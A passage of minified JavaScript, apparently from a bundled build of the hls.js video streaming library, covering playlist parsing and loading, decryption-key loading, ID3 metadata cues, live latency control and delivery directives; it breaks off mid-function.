Ib(wb),ya.canBlockReload=wb.bool("CAN-BLOCK-RELOAD"),ya.canSkipUntil=wb.optionalFloat("CAN-SKIP-UNTIL",0),ya.canSkipDateRanges=0<ya.canSkipUntil&&wb.bool("CAN-SKIP-DATERANGES"),ya.partHoldBack=wb.optionalFloat("PART-HOLD-BACK",0),ya.holdBack=wb.optionalFloat("HOLD-BACK",0);break;case"PART-INF":wb=new Ib(wb),ya.partTarget=wb.decimalFloatingPoint("PART-TARGET");break;case"PART":(K=ya.partList)||(K=ya.partList=[]),bc=0<Ua?K[K.length-1]:void 0,ea=Ua++,wb=new Eb.c(new Ib(wb),gb,n,ea,bc),K.push(wb),gb.duration+=wb.duration;break;case"PRELOAD-HINT":wb=new Ib(wb),ya.preloadHint=wb;break;case"RENDITION-REPORT":wb=new Ib(wb),ya.renditionReports=ya.renditionReports||[],ya.renditionReports.push(wb);break;default:Fa.b.warn("line parsed but not handled: "+K)}}else Fa.b.warn("No matches on slow regex match for level playlist!")}return ub&&!ub.relurl?(Ea.pop(),kb-=ub.duration,ya.partList&&(ya.fragmentHint=ub)):ya.partList&&(M(gb,ub),gb.cc=cb,ya.fragmentHint=gb),sa=Ea.length,ca=Ea[0],y=Ea[sa-1],0<(kb+=ya.skippedSegments*ya.targetduration)&&sa&&y?(ya.averagetargetduration=kb/sa,sa=y.sn,ya.endSN="initSegment"!==sa?sa:0,ca&&(ya.startCC=ca.cc,ya.initSegment||ya.fragments.every((function(Lb){return Lb.relurl&&(Gc=Lb.relurl,Xa.test(null!=(Yc=null===(Kc=Za.parseURL(Gc))||void 0===Kc?void 0:Kc.path)?Yc:""));var Gc,Yc,Kc}))&&(Fa.b.warn("MP4 fragments found but no init segment (probably no MAP, incomplete M3U8), trying to fetch SIDX"),(gb=new Eb.b(e,n)).relurl=y.relurl,gb.level=k,gb.sn="initSegment",ya.initSegment=gb,ya.needSidxRanges=!0))):(ya.endSN=0,ya.startCC=0),ya.fragmentHint&&(kb+=ya.fragmentHint.duration),ya.totalduration=kb,ya.endCC=cb,0<Gb&&function(Lb,Gc){for(var Yc=Lb[Gc];Gc--;){var Kc=Lb[Gc];if(!Kc)break;Kc.programDateTime=Yc.programDateTime-1e3*Kc.duration,Yc=Kc}}(Ea,Gb),ya},ta}();(ta=ob||(ob={})).MANIFEST="manifest",ta.LEVEL="level",ta.AUDIO_TRACK="audioTrack",ta.SUBTITLE_TRACK="subtitleTrack",function(ta){ta.MAIN="main",ta.AUDIO="audio",ta.SUBTITLE="subtitle"}(lb||(lb={}));var kc,Sb=function(){function ta(n){this.hls=void 0,this.loaders=Object.create(null),this.hls=n,this.registerListeners()}var ca=ta.prototype;return ca.registerListeners=function(){var n=this.hls;n.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),n.on(ua.a.LEVEL_LOADING,this.onLevelLoading,this),n.on(ua.a.AUDIO_TRACK_LOADING,this.onAudioTrackLoading,this),n.on(ua.a.SUBTITLE_TRACK_LOADING,this.onSubtitleTrackLoading,this)},ca.unregisterListeners=function(){var n=this.hls;n.off(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),n.off(ua.a.LEVEL_LOADING,this.onLevelLoading,this),n.off(ua.a.AUDIO_TRACK_LOADING,this.onAudioTrackLoading,this),n.off(ua.a.SUBTITLE_TRACK_LOADING,this.onSubtitleTrackLoading,this)},ca.createInternalLoader=function(n){var k=this.hls.config,e=k.loader;return k=new(k.pLoader||e)(k),n.loader=k,this.loaders[n.type]=k,k},ca.getInternalLoader=function(n){return this.loaders[n.type]},ca.resetInternalLoader=function(n){this.loaders[n]&&delete this.loaders[n]},ca.destroyInternalLoaders=function(){for(var n in this.loaders){var k=this.loaders[n];k&&k.destroy(),this.resetInternalLoader(n)}},ca.destroy=function(){this.unregisterListeners(),this.destroyInternalLoaders()},ca.onManifestLoading=function(n,k){this.load({id:null,groupId:null,level:0,responseType:"text",type:ob.MANIFEST,url:k.url,deliveryDirectives:null})},ca.onLevelLoading=function(n,k){this.load({id:k.id,groupId:null,level:k.level,responseType:"text",type:ob.LEVEL,url:k.url,deliveryDirectives:k.deliveryDirectives})},ca.onAudioTrackLoading=function(n,k){this.load({id:k.id,groupId:k.groupId,level:null,responseType:"text",type:ob.AUDIO_TRACK,url:k.url,deliveryDirectives:k.deliveryDirectives})},ca.onSubtitleTrackLoading=function(n,k){this.load({id:k.id,groupId:k.groupId,level:null,responseType:"text",type:ob.SUBTITLE_TRACK,url:k.url,deliveryDirectives:k.deliveryDirectives})},ca.load=function(n){var k,e,y,K=this.hls.config,ea=this.getInternalLoader(n);if(ea){if((e=ea.context)&&e.url===n.url)return void Fa.b.trace("[playlist-loader]: playlist request ongoing");Fa.b.log("[playlist-loader]: aborting previous loader for type: "+n.type),ea.abort()}switch(n.type){case ob.MANIFEST:e=K.manifestLoadingMaxRetry;var sa=K.manifestLoadingTimeOut,ya=K.manifestLoadingRetryDelay,Ea=K.manifestLoadingMaxRetryTimeout;break;case ob.LEVEL:case ob.AUDIO_TRACK:case ob.SUBTITLE_TRACK:e=0,sa=K.levelLoadingTimeOut;break;default:e=K.levelLoadingMaxRetry,sa=K.levelLoadingTimeOut,ya=K.levelLoadingRetryDelay,Ea=K.levelLoadingMaxRetryTimeout}ea=this.createInternalLoader(n),null!==(k=n.deliveryDirectives)&&void 0!==k&&k.part&&(n.type===ob.LEVEL&&null!==n.level?y=this.hls.levels[n.level].details:n.type===ob.AUDIO_TRACK&&null!==n.id?y=this.hls.audioTracks[n.id].details:n.type===ob.SUBTITLE_TRACK&&null!==n.id&&(y=this.hls.subtitleTracks[n.id].details),y)&&(k=y.partTarget,y=y.targetduration,k&&y&&(sa=Math.min(1e3*Math.max(3*k,.8*y),sa))),ya={timeout:sa,maxRetry:e,retryDelay:ya,maxRetryDelay:Ea,highWaterMark:0},Ea={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)},ea.load(n,ya,Ea)},ca.loadsuccess=function(n,k,e,y){if(void 0===y&&(y=null),e.isSidxRequest)return this.handleSidxRequest(n,e),void this.handlePlaylistLoaded(n,k,e,y);this.resetInternalLoader(e.type);var K=n.data;0===K.indexOf("#EXTM3U")?(k.parsing.start=performance.now(),0<K.indexOf("#EXTINF:")||0<K.indexOf("#EXT-X-TARGETDURATION:")?this.handleTrackOrLevelPlaylist(n,k,e,y):this.handleMasterPlaylist(n,k,e,y)):this.handleManifestParsingError(n,e,"no EXTM3U delimiter",y)},ca.loaderror=function(n,k,e){void 0===e&&(e=null),this.handleNetworkError(k,e,!1,n)},ca.loadtimeout=function(n,k,e){void 0===e&&(e=null),this.handleNetworkError(k,e,!0)},ca.handleMasterPlaylist=function(n,k,e,y){var K=this.hls,ea=n.data,sa=v(n,e),ya=Kb.parseMasterPlaylist(ea,sa),Ea=ya.levels;ya=ya.sessionData,Ea.length?(n=Ea.map((function(Ha){return{id:Ha.attrs.AUDIO,audioCodec:Ha.audioCodec}})),e=Ea.map((function(Ha){return{id:Ha.attrs.SUBTITLES,textCodec:Ha.textCodec}})),n=Kb.parseMasterPlaylistMedia(ea,sa,"AUDIO",n),e=Kb.parseMasterPlaylistMedia(ea,sa,"SUBTITLES",e),ea=Kb.parseMasterPlaylistMedia(ea,sa,"CLOSED-CAPTIONS"),n.length&&(n.some((function(Ha){return!Ha.url}))||!Ea[0].audioCodec||Ea[0].attrs.AUDIO||(Fa.b.log("[playlist-loader]: audio codec signaled in quality level, but no embedded audio track signaled, create one"),n.unshift({type:"main",name:"main",default:!1,autoselect:!1,forced:!1,id:-1,attrs:new Ib({}),bitrate:0,url:""}))),K.trigger(ua.a.MANIFEST_LOADED,{levels:Ea,audioTracks:n,subtitles:e,captions:ea,url:sa,stats:k,networkDetails:y,sessionData:ya})):this.handleManifestParsingError(n,e,"no level found in manifest",y)},ca.handleTrackOrLevelPlaylist=function(n,k,e,y){var K=this.hls,ea=e.id,sa=e.level,ya=e.type,Ea=v(n,e),Ha=Object($a.a)(ea)?ea:0,Ua=Object($a.a)(sa)?sa:Ha;a:switch(e.type){case ob.AUDIO_TRACK:var kb=lb.AUDIO;break a;case ob.SUBTITLE_TRACK:kb=lb.SUBTITLE;break a;default:kb=lb.MAIN}(Ha=Kb.parseLevelPlaylist(n.data,Ea,Ua,kb,Ha)).fragments.length?(ya===ob.MANIFEST&&(Ua={attrs:new Ib({}),bitrate:0,details:Ha,name:"",url:Ea},K.trigger(ua.a.MANIFEST_LOADED,{levels:[Ua],audioTracks:[],url:Ea,stats:k,networkDetails:y,sessionData:null})),k.parsing.end=performance.now(),Ha.needSidxRanges?this.load({url:Ha.initSegment.url,isSidxRequest:!0,type:ya,level:sa,levelDetails:Ha,id:ea,groupId:null,rangeStart:0,rangeEnd:2048,responseType:"arraybuffer",deliveryDirectives:null}):(e.levelDetails=Ha,this.handlePlaylistLoaded(n,k,e,y))):K.trigger(ua.a.ERROR,{type:Ka.b.NETWORK_ERROR,details:Ka.a.LEVEL_EMPTY_ERROR,fatal:!1,url:Ea,reason:"no fragments found in level",level:"number"==typeof e.level?e.level:void 0})},ca.handleSidxRequest=function(n,k){if(n=Object(tb.g)(new Uint8Array(n.data))){var e=k.levelDetails;n.references.forEach((function(y,K){y=y.info,0===(K=e.fragments[K]).byteRange.length&&K.setByteRange(String(1+y.end-y.start)+"@"+String(y.start))})),e.initSegment.setByteRange(String(n.moovEndOffset)+"@0")}},ca.handleManifestParsingError=function(n,k,e,y){this.hls.trigger(ua.a.ERROR,{type:Ka.b.NETWORK_ERROR,details:Ka.a.MANIFEST_PARSING_ERROR,fatal:k.type===ob.MANIFEST,url:n.url,reason:e,response:n,context:k,networkDetails:y})},ca.handleNetworkError=function(n,k,e,y){void 0===e&&(e=!1),Fa.b.warn("[playlist-loader]: A network "+(e?"timeout":"error")+" occurred while loading "+n.type+" level: "+n.level+" id: "+n.id+' group-id: "'+n.groupId+'"');var K=Ka.a.UNKNOWN,ea=!1,sa=this.getInternalLoader(n);switch(n.type){case ob.MANIFEST:K=e?Ka.a.MANIFEST_LOAD_TIMEOUT:Ka.a.MANIFEST_LOAD_ERROR,ea=!0;break;case ob.LEVEL:K=e?Ka.a.LEVEL_LOAD_TIMEOUT:Ka.a.LEVEL_LOAD_ERROR,ea=!1;break;case ob.AUDIO_TRACK:K=e?Ka.a.AUDIO_TRACK_LOAD_TIMEOUT:Ka.a.AUDIO_TRACK_LOAD_ERROR,ea=!1;break;case ob.SUBTITLE_TRACK:K=e?Ka.a.SUBTITLE_TRACK_LOAD_TIMEOUT:Ka.a.SUBTITLE_LOAD_ERROR,ea=!1}sa&&this.resetInternalLoader(n.type),n={type:Ka.b.NETWORK_ERROR,details:K,fatal:ea,url:n.url,loader:sa,context:n,networkDetails:k},y&&(n.response=y),this.hls.trigger(ua.a.ERROR,n)},ca.handlePlaylistLoaded=function(n,k,e,y){var K=e.type,ea=e.level,sa=e.id,ya=e.groupId,Ea=e.loader,Ha=e.levelDetails,Ua=e.deliveryDirectives;if(null!=Ha&&Ha.targetduration){if(Ea)switch(Ha.live&&(Ea.getCacheAge&&(Ha.ageHeader=Ea.getCacheAge()||0),Ea.getCacheAge&&!isNaN(Ha.ageHeader)||(Ha.ageHeader=0)),K){case ob.MANIFEST:case ob.LEVEL:this.hls.trigger(ua.a.LEVEL_LOADED,{details:Ha,level:ea||0,id:sa||0,stats:k,networkDetails:y,deliveryDirectives:Ua});break;case ob.AUDIO_TRACK:this.hls.trigger(ua.a.AUDIO_TRACK_LOADED,{details:Ha,id:sa||0,groupId:ya||"",stats:k,networkDetails:y,deliveryDirectives:Ua});break;case ob.SUBTITLE_TRACK:this.hls.trigger(ua.a.SUBTITLE_TRACK_LOADED,{details:Ha,id:sa||0,groupId:ya||"",stats:k,networkDetails:y,deliveryDirectives:Ua})}}else this.handleManifestParsingError(n,e,"invalid target duration",y)},ta}(),ac=function(){function ta(n){this.loaders={},this.decrypturl=this.decryptkey=null,this.hls=n,this._registerListeners()}var ca=ta.prototype;return ca._registerListeners=function(){this.hls.on(ua.a.KEY_LOADING,this.onKeyLoading,this)},ca._unregisterListeners=function(){this.hls.off(ua.a.KEY_LOADING,this.onKeyLoading)},ca.destroy=function(){for(var n in this._unregisterListeners(),this.loaders){var k=this.loaders[n];k&&k.destroy()}this.loaders={}},ca.onKeyLoading=function(n,k){var e=k.frag;k=e.type;var y=this.loaders[k];if(e.decryptdata){var K=e.decryptdata.uri;if(K!==this.decrypturl||null===this.decryptkey){if(n=this.hls.config,y&&(Fa.b.warn("abort previous key loader for type:"+k),y.abort()),!K)return void Fa.b.warn("key uri is falsy");k=e.loader=this.loaders[k]=new n.loader(n),this.decrypturl=K,this.decryptkey=null,e={url:K,frag:e,responseType:"arraybuffer"},n={timeout:n.fragLoadingTimeOut,maxRetry:0,retryDelay:n.fragLoadingRetryDelay,maxRetryDelay:n.fragLoadingMaxRetryTimeout,highWaterMark:0},K={onSuccess:this.loadsuccess.bind(this),onError:this.loaderror.bind(this),onTimeout:this.loadtimeout.bind(this)},k.load(e,n,K)}else this.decryptkey&&(e.decryptdata.key=this.decryptkey,this.hls.trigger(ua.a.KEY_LOADED,{frag:e}))}else Fa.b.warn("Missing decryption data on fragment in onKeyLoading")},ca.loadsuccess=function(n,k,e){(k=e.frag).decryptdata?(this.decryptkey=k.decryptdata.key=new Uint8Array(n.data),k.loader=null,delete this.loaders[k.type],this.hls.trigger(ua.a.KEY_LOADED,{frag:k})):Fa.b.error("after key load, decryptdata unset")},ca.loaderror=function(n,k){var e=(k=k.frag).loader;e&&e.abort(),delete this.loaders[k.type],this.hls.trigger(ua.a.ERROR,{type:Ka.b.NETWORK_ERROR,details:Ka.a.KEY_LOAD_ERROR,fatal:!1,frag:k,response:n})},ca.loadtimeout=function(n,k){(k=(n=k.frag).loader)&&k.abort(),delete this.loaders[n.type],this.hls.trigger(ua.a.ERROR,{type:Ka.b.NETWORK_ERROR,details:Ka.a.KEY_LOAD_TIMEOUT,fatal:!1,frag:n})},ta}(),hc=Na(6),xc=function(){function ta(n){this.hls=void 0,this.media=this.id3Track=null,this.hls=n,this._registerListeners()}var ca=ta.prototype;return ca.destroy=function(){this._unregisterListeners()},ca._registerListeners=function(){var n=this.hls;n.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),n.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.on(ua.a.FRAG_PARSING_METADATA,this.onFragParsingMetadata,this),n.on(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this)},ca._unregisterListeners=function(){var n=this.hls;n.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),n.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),n.off(ua.a.FRAG_PARSING_METADATA,this.onFragParsingMetadata,this),n.off(ua.a.BUFFER_FLUSHING,this.onBufferFlushing,this)},ca.onMediaAttached=function(n,k){this.media=k.media},ca.onMediaDetaching=function(){this.id3Track&&(l(this.id3Track),this.id3Track=null,this.media=null)},ca.getID3Track=function(n){if(this.media){for(var k=0;k<n.length;k++){var e=n[k];if("metadata"===e.kind&&"id3"===e.label)return m(e,this.media),e}return this.media.addTextTrack("metadata","id3")}},ca.onFragParsingMetadata=function(n,k){if(this.media){n=k.frag,k=k.samples,this.id3Track||(this.id3Track=this.getID3Track(this.media.textTracks),this.id3Track.mode="hidden");for(var e=self.WebKitDataCue||self.VTTCue||self.TextTrackCue,y=0;y<k.length;y++){var K=hc.c(k[y].data);if(K){var ea=k[y].pts,sa=y<k.length-1?k[y+1].pts:n.end;0>=sa-ea&&(sa=ea+.25);for(var ya=0;ya<K.length;ya++){var Ea=K[ya];if(!hc.e(Ea)){var Ha=new e(ea,sa,"");Ha.value=Ea,this.id3Track.addCue(Ha)}}}}}},ca.onBufferFlushing=function(n,k){n=k.startOffset;var e=k.endOffset;(k=k.type)&&"audio"!==k||(k=this.id3Track)&&f(k,n,e)},ta}(),cc=function(){function ta(k){var e=this;this.config=this.hls=void 0,this.levelDetails=this.media=null,this.stallCount=this.currentTime=0,this._latency=null,this.timeupdateHandler=function(){return e.timeupdate()},this.hls=k,this.config=k.config,this.registerListeners()}var ca,n=ta.prototype;return n.destroy=function(){this.unregisterListeners(),this.onMediaDetaching(),this.hls=this.timeupdateHandler=this.levelDetails=null},n.registerListeners=function(){this.hls.on(ua.a.MEDIA_ATTACHED,this.onMediaAttached,this),this.hls.on(ua.a.MEDIA_DETACHING,this.onMediaDetaching,this),this.hls.on(ua.a.MANIFEST_LOADING,this.onManifestLoading,this),this.hls.on(ua.a.LEVEL_UPDATED,this.onLevelUpdated,this),this.hls.on(ua.a.ERROR,this.onError,this)},n.unregisterListeners=function(){this.hls.off(ua.a.MEDIA_ATTACHED,this.onMediaAttached),this.hls.off(ua.a.MEDIA_DETACHING,this.onMediaDetaching),this.hls.off(ua.a.MANIFEST_LOADING,this.onManifestLoading),this.hls.off(ua.a.LEVEL_UPDATED,this.onLevelUpdated),this.hls.off(ua.a.ERROR,this.onError)},n.onMediaAttached=function(k,e){this.media=e.media,this.media.addEventListener("timeupdate",this.timeupdateHandler)},n.onMediaDetaching=function(){this.media&&(this.media.removeEventListener("timeupdate",this.timeupdateHandler),this.media=null)},n.onManifestLoading=function(){this._latency=this.levelDetails=null,this.stallCount=0},n.onLevelUpdated=function(k,e){this.levelDetails=k=e.details,k.advanced&&this.timeupdate(),!k.live&&this.media&&this.media.removeEventListener("timeupdate",this.timeupdateHandler)},n.onError=function(k,e){e.details===Ka.a.BUFFER_STALLED_ERROR&&(this.stallCount++,Fa.b.warn("[playback-rate-controller]: Stall detected, adjusting target latency"))},n.timeupdate=function(){var k=this.media,e=this.levelDetails;if(k&&e){this.currentTime=k.currentTime;var y=this.computeLatency();if(null!==y){this._latency=y;var K=this.config,ea=K.maxLiveSyncPlaybackRate;K.lowLatencyMode&&1!==ea&&null!==(K=this.targetLatency)&&(K=(y-=K)<Math.min(this.maxLatency,K+e.targetduration),e.live&&K&&.05<y&&1<this.forwardBufferLength?k.playbackRate=Math.min(Math.min(2,Math.max(1,ea)),Math.max(1,Math.round(2/(1+Math.exp(-.75*y-this.edgeStalled))*20)/20)):1!==k.playbackRate&&0!==k.playbackRate&&(k.playbackRate=1))}}},n.estimateLiveEdge=function(){var k=this.levelDetails;return null===k?null:k.edge+k.age},n.computeLatency=function(){var k=this.estimateLiveEdge();return null===k?null:k-this.currentTime},ca=[{key:"latency",get:function(){return this._latency||0}},{key:"maxLatency",get:function(){var k=this.config,e=this.levelDetails;return void 0!==k.liveMaxLatencyDuration?k.liveMaxLatencyDuration:e?k.liveMaxLatencyDurationCount*e.targetduration:0}},{key:"targetLatency",get:function(){var k=this.levelDetails;if(null===k)return null;var e=k.holdBack,y=k.partHoldBack;k=k.targetduration;var K=this.config,ea=K.liveSyncDuration,sa=K.liveSyncDurationCount,ya=this.hls.userConfig;return e=K.lowLatencyMode&&y||e,(ya.liveSyncDuration||ya.liveSyncDurationCount||0===e)&&(e=void 0!==ea?ea:sa*k),e+Math.min(1*this.stallCount,k)}},{key:"liveSyncPosition",get:function(){var k=this.estimateLiveEdge(),e=this.targetLatency,y=this.levelDetails;if(null===k||null===e||null===y)return null;var K=y.edge;return Math.min(Math.max(K-y.totalduration,k-e-this.edgeStalled),K-(this.config.lowLatencyMode&&y.partTarget||y.targetduration))}},{key:"drift",get:function(){var k=this.levelDetails;return null===k?1:k.drift}},{key:"edgeStalled",get:function(){var k=this.levelDetails;return null===k?0:Math.max(k.age-3*(this.config.lowLatencyMode&&k.partTarget||k.targetduration),0)}},{key:"forwardBufferLength",get:function(){var k=this.media,e=this.levelDetails;if(!k||!e)return 0;var y=k.buffered.length;return y?k.buffered.end(y-1):e.edge-this.currentTime}}],function g(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ta.prototype,ca),ta}();!function(ta){ta.No="",ta.Yes="YES",ta.v2="v2"}(kc||(kc={}));var Ia,ab=function(){function ta(ca,n,k){this.msn=ca,this.part=n,this.skip=k}return ta.prototype.addDirectives=function(ca){var n=(ca=new self.URL(ca)).searchParams;return void 0!==this.msn&&n.set("_HLS_msn",this.msn.toString()),void 0!==this.part&&n.set("_HLS_part",this.part.toString()),this.skip&&n.set("_HLS_skip",this.skip),n.sort(),ca.search=n.toString(),ca.toString()},ta}(),Fb=function(){function ta(n){this.details=this.audioGroupIds=this.unknownCodecs=this.width=this.videoCodec=this.name=this.id=this.height=this.codecSet=this.bitrate=this.audioCodec=this.attrs=void 0,this.loadError=this.fragmentError=0,this.loaded=void 0,this.realBitrate=0,this.url=this.textGroupIds=void 0,this._urlId=0,this.url=[n.url],this.attrs=n.attrs,this.bitrate=n.bitrate,n.details&&(this.details=n.details),this.id=n.id||0,this.name=n.name,this.width=n.width||0,this.height=n.height||0,this.audioCodec=n.audioCodec,this.videoCodec=n.videoCodec,this.unknownCodecs=n.unknownCodecs,this.codecSet=[n.videoCodec,n.audioCodec].filter((function(k){return k})).join(",").replace(/\.[^.,]+/g,"")}var ca;return ca=[{key:"maxBitrate",get:function(){return Math.max(this.realBitrate,this.bitrate)}},{key:"uri",get:function(){return this.url[this._urlId]||""}},{key:"urlId",get:function(){return this._urlId},set:function(n){n%=this.url.length,this._urlId!==n&&(this.details=void 0,this._urlId=n)}}],function t(ta,ca){for(var n=0;n<ca.length;n++){var k=ca[n];k.enumerable=k.enumerable||!1,k.configurable=!0,"value"in k&&(k.writable=!0),Object.defineProperty(ta,k.key,k)}}(ta.prototype,ca),ta}(),Wb=function(){function ta(n,k){this.hls=void 0,this.timer=-1,this.canLoad=!1,this.retryCount=0,this.warn=this.log=void 0,this.log=Fa.b.log.bind(Fa.b,k+":"),this.warn=Fa.b.warn.bind(Fa.b,k+":"),this.hls=n}var ca=ta.prototype;return ca.destroy=function(){this.clearTimer(),this.hls=this.log=this.warn=null},ca.onError=function(n,k){k.fatal&&k.type===Ka.b.NETWORK_ERROR&&this.clearTimer()},ca.clearTimer=function(){clearTimeout(this.timer),this.timer=-1},ca.startLoad=function(){this.canLoad=!0,this.retryCount=0,this.loadPlaylist()},ca.stopLoad=function(){this.canLoad=!1,this.clearTimer()},ca.switchParams=function(n,k){var e=null==k?void 0:k.renditionReports;if(e)for(var y=0;y<e.length;y++){var K=e[y],ea=""+K.URI;if(ea===n.substr(-ea.length)){if(ea=parseInt(K["LAST-MSN"]),K=parseInt(K["LAST-PART"]),k&&this.hls.config.lowLatencyMode){var sa=Math.min(k.age-k.partTarget,k.targetduration);void 0!==K&&sa>k.partTarget&&(K+=1)}if(Object($a.a)(ea))return new ab(ea,Object($a.a)(K)?K:void 0,kc.No)}}},ca.loadPlaylist=function(n){},ca.shouldLoadTrack=function(n){return this.canLoad&&n&&!!n.url&&(!n.details||n.details.live)},ca.playlistLoaded=function(n,k,e){var y=this,K=k.details,ea=k.stats,sa=ea.loading.end?Math.max(0,self.performance.now()-ea.loading.end):0;if(K.advancedDateTime=Date.now()-sa,K.live||null!=e&&e.live){if(K.reloaded(e),e&&this.log("live playlist "+n+" "+(K.advanced?"REFRESHED "+K.lastPartSn+"-"+K.lastPartIndex:"MISSED")),e&&0<K.fragments.length&&function E(ta,ca){ca.initSegment&&ta.initSegment&&(ca.initSegment=ta.initSegment),ta.fragmentHint&&delete ta.fragmentHint.endPTS;var n,k=0;if(function(K,ea,sa){var ya=ea.skippedSegments,Ea=Math.max(K.startSN,ea.startSN)-ea.startSN,Ha=(K.fragmentHint?1:0)+(ya?ea.endSN:Math.min(K.endSN,ea.endSN))-ea.startSN,Ua=ea.startSN-K.startSN,kb=ea.fragmentHint?ea.fragments.concat(ea.fragmentHint):ea.fragments;for(K=K.fragmentHint?K.fragments.concat(K.fragmentHint):K.fragments;Ea<=Ha;Ea++){var cb=K[Ua+Ea],ub=kb[Ea];ya&&!ub&&Ea<ya&&(ub=ea.fragments[Ea]=cb),cb&&ub&&sa(cb,ub)}}(ta,ca,(function(K,ea){K.relurl&&(k=K.cc-ea.cc),Object($a.a)(K.startPTS)&&Object($a.a)(K.endPTS)&&(ea.start=ea.startPTS=K.startPTS,ea.startDTS=K.startDTS,ea.appendedPTS=K.appendedPTS,ea.maxStartPTS=K.maxStartPTS,ea.endPTS=K.endPTS,ea.endDTS=K.endDTS,ea.minEndPTS=K.minEndPTS,ea.duration=K.endPTS-K.startPTS,ea.duration&&(n=ea),ca.PTSKnown=ca.alignedSliding=!0),ea.elementaryStreams=K.elementaryStreams,ea.loader=K.loader,ea.stats=K.stats,ea.urlId=K.urlId})),ca.skippedSegments&&(ca.deltaUpdateFailed=ca.fragments.some((function(K){return!K})),ca.deltaUpdateFailed)){Fa.b.warn("[level-helper] Previous playlist missing segments skipped in delta playlist");for(var e=ca.skippedSegments;e--;)ca.fragments.shift();ca.startSN=ca.fragments[0].sn,ca.startCC=ca.fragments[0].cc}if(e=ca.fragments,k){Fa.b.warn("discontinuity sliding from playlist, take drift into account");for(var y=0;y<e.length;y++)e[y].cc+=k}ca.skippedSegments&&(ca.initSegment||(ca.initSegment=ta.initSegment),ca.startCC=ca.fragments[0].cc),function(K,ea,sa){if(K&&ea)for(var ya=0,Ea=0,Ha=K.length;Ea<=Ha;Ea++){var Ua=K[Ea],kb=ea[Ea+ya];Ua&&kb&&Ua.index===kb.index&&Ua.fragment.sn===kb.fragment.sn?sa(Ua,kb):ya--}}(ta.partList,ca.partList,(function(K,ea){ea.elementaryStreams=K.elementaryStreams,ea.stats=K.stats})),n?J(ca,n,n.startPTS,n.endPTS,n.startDTS,n.endDTS):D(ta,ca),e.length&&(ca.totalduration=ca.edge-e[0].start),ca.driftStartTime=ta.driftStartTime,ca.driftStart=ta.driftStart,e=ca.advancedDateTime,ca.advanced&&e?(ta=ca.edge,ca.driftStart||(ca.driftStartTime=e,ca.driftStart=ta),ca.driftEndTime=e,ca.driftEnd=ta):(ca.driftEndTime=ta.driftEndTime,ca.driftEnd=ta.driftEnd,ca.advancedDateTime=ta.advancedDateTime)}(e,K),this.canLoad&&K.live){var ya=sa=void 0;if(K.canBlockReload&&K.endSN&&K.advanced)return n=K.lastPartIndex,this.hls.config.lowLatencyMode?(sa=-1!==n?K.lastPartSn:K.endSN+1,ya=-1!==n?n+1:void 0):(sa=-1!==n?K.lastPartSn+1:K.endSN+1,ya=-1!==n?0:void 0),n=K.age,0<(ea=Math.min(n+K.ageHeader-K.partTarget,1.5*K.targetduration))&&(e&&ea>e.tuneInGoal?(this.warn("CDN Tune-in goal increased from: "+e.tuneInGoal+" to: "+ea+" with playlist age: "+K.age),ea=0):(sa+=e=Math.floor(ea/K.targetduration),void 0!==ya&&(ya+=Math.round(ea%K.targetduration/K.partTarget)),this.log("CDN Tune-in age: "+K.ageHeader+"s last advanced "+n.toFixed(2)+"s goal: "+ea+" skip sn "+e+" to part "+ya)),K.tuneInGoal=ea),k=this.getDeliveryDirectives(K,k.deliveryDirectives,sa,ya),void this.loadPlaylist(k);e=function(Ha,Ua){var kb=1e3*Ha.levelTargetDuration,cb=kb/2,ub=Ha.age,gb=0<ub&&ub<3*kb;Ua=Ua.loading.end-Ua.loading.start;var Gb=Ha.availabilityDelay;if(!1===Ha.updated)if(gb){var wb=Math.max(Math.min(cb,2*Ua),333*Ha.misses);Ha.availabilityDelay=(Ha.availabilityDelay||0)+wb}else wb=cb;else gb?(Gb=Math.min(Gb||kb/2,ub),Ha.availabilityDelay=Gb,wb=Gb+kb-ub):wb=kb-Ua;return Math.round(wb)}(K,ea),this.log("reload live playlist "+n+" in "+Math.round(e)+" ms");var Ea=this.getDeliveryDirectives(K,k.deliveryDirectives,sa,ya);this.timer=self.setTimeout((function(){return y.loadPlaylist(Ea)}),e)}}else this.clearTimer()},ca.getDeliveryDirectives=function(n,k,e,y){var K=n.canSkipUntil,ea=n.canSkipDateRanges,sa=n.endSN;return K=K&&(void 0!==e?e-sa:0)<K?ea?kc.v2:kc.Yes:kc.No,null!=k&&k.skip&&n.deltaUpdateFailed&&(e=k.msn,y=k.part,K=kc.No),new ab(e,y,K)},ca.retryLoadingOrFail=function(n){var k,e=this,y=this.hls.config,K=this.retryCount<y.levelLoadingMaxRetry;return K?(this.retryCount++,-1<n.details.indexOf("LoadTimeOut")&&null!==(k=n.context)&&void 0!==k&&k.deliveryDirectives?(this.warn("retry playlist loading #"+this.retryCount+' after "'+n.details+'"'),this.loadPlaylist()):(k=Math.min(Math.pow(2,this.retryCount)*y.levelLoadingRetryDelay,y.levelLoadingMaxRetryTimeout),this.timer=self.setTimeout((function(){return e.loadPlaylist()}),k),this.warn("retry playlist loading #"+this.retryCount+" in "+k+' ms after "'+n.details+'"'))):(this.warn('cannot recover from error "'+n.details+'"'),this.clearTimer(),n.fatal=!0),K},ta}(),vb=/chrome|firefox/.test(navigator.userAgent.toLowerCase()),Hb=function(ta){function ca(e){var y;return(y=ta.call(this,e,"[level-controller]")||this)._levels=[],y._firstLevel=-1,y._startLevel=void 0,y.currentLevelIndex=-1,y.manualLevelIndex=-1,y.onParsedComplete=void 0,y._registerListeners(),y}ca.prototype=Object.create(ta.prototype),ca.prototype.constructor=ca,G(ca,ta);var n,k=ca.prototype;return k._registerListeners=function(){var e=this.hls;e.on(ua.a.MANIFEST_LOADED,this.onManifestLoaded,this),e.on(ua.a.LEVEL_LOADED,this.onLevelLoaded,this),e.on(ua.a.AUDIO_TRACK_SWITCHED,this.onAudioTrackSwitched,this),e.on(ua.a.FRAG_LOADED,this.onFragLoaded,this),e.on(ua.a.ERROR,this.onError,this)},k._unregisterListeners=function(){var 